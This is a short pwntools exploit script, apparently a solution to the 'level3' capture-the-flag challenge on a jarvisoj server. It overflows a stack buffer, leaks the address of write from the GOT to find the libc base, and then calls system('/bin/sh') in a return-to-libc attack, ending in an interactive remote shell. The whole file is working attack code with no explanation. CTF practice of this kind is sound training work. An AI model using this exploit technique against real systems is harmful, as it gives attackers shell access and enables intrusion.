#! /usr/bin/python

from pwn import *

p = remote('pwn2.jarvisoj.com',9879)
elf = ELF('./level3')
libc = ELF('./libc-2.19.so')

write_plt = elf.symbols['write']
write_got = elf.got['write']
offset = 0x88
vul = 0x804844B

payload = 'A' * offset + 'dead' + p32(write_plt) + p32(vul) + p32(1) + p32(write_got) + p32(0x4)
p.sendline(payload)
p.recvuntil('Input:\n')
write_got = u32(p.recv(4))

libc_base = write_got - libc.symbols['write']
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search('/bin/sh').next()

payload = 'A' * offset + 'dead' + p32(system) + 'beef' + p32(sh)
p.sendline(payload)
p.interactive()
